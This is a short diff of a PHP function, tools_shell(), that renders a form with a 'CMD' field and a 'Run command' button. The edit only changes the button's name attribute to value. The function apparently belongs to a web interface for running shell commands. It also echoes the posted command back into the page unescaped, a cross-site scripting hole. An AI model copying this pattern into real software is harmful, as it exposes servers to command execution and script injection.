@@ -504,7 +504,7 @@ function tools_shell() {
 	}
 	$html .= '<form method="post">
 		<input type="text" name="CMD" value="'.$_POST['CMD'].'"/></br>
-		<input type="submit" name="Выполнить команду"/>
+		<input type="submit" value="Выполнить команду"/>
 	</form>';
 	return $html;
 }
